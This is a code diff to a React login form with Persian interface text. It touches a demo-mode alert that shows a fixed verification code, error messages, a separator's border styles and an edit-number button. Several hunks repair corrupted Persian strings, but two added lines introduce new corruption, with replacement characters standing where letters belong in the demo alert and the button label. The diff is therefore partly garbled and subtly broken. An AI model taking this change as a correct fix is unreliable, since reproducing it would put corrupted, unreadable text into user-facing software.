@@ -241,7 +241,7 @@ export const LoginForm = () => {
       if (!validateTelegramConfig()) {
         console.log("🎭 Demo verification code: 123456");
         alert(
-          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ارسال می‌شود)",
+          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت وا��عی این کد به تلگرام ارسال می‌شود)",
         );
       }
 
@@ -250,7 +250,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Phone submission error:", error);
       setErrors({
-        mobileNumber: "خطا ��ر ارسال اطلاعات. لطفا دوباره تلاش کنید.",
+        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -350,7 +350,7 @@ export const LoginForm = () => {
 
     if (!validatePassword(password)) {
       setErrors({
-        password: "ر��ز عبور نمی‌تواند خالی باشد",
+        password: "رمز عبور نمی‌تواند خالی باشد",
       });
       return;
     }
@@ -791,14 +791,18 @@ export const LoginForm = () => {
         {/* Separator */}
         <hr
           style={{
-            borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
             borderBottomStyle: "solid",
             borderBottomWidth: "1px",
-            borderColor: "rgba(0, 0, 0, 0.2)",
+            borderBottomColor: "rgba(0, 0, 0, 0.2)",
             borderLeftStyle: "solid",
+            borderLeftWidth: "0",
+            borderLeftColor: "rgba(0, 0, 0, 0.2)",
             borderRightStyle: "solid",
-            borderStyle: "solid",
+            borderRightWidth: "0",
+            borderRightColor: "rgba(0, 0, 0, 0.2)",
             borderTopStyle: "solid",
+            borderTopWidth: "0",
+            borderTopColor: "rgba(0, 0, 0, 0.2)",
             flexShrink: "0",
             marginLeft: "-20px",
             marginRight: "-20px",
@@ -1535,7 +1539,7 @@ export const LoginForm = () => {
                         textEmphasisColor: "rgb(0, 122, 255)",
                       }}
                     >
-                      <span>کد تای��د به شماره </span>
+                      <span>کد تایید به شماره </span>
                       <b
                         dir="ltr"
                         style={{
@@ -1898,7 +1902,7 @@ export const LoginForm = () => {
                       fontSize: "14px",
                     }}
                   >
-                    ویرایش شماره
+                    ویرایش شم��ره
                   </button>
 
                   {/* Submit Button */}
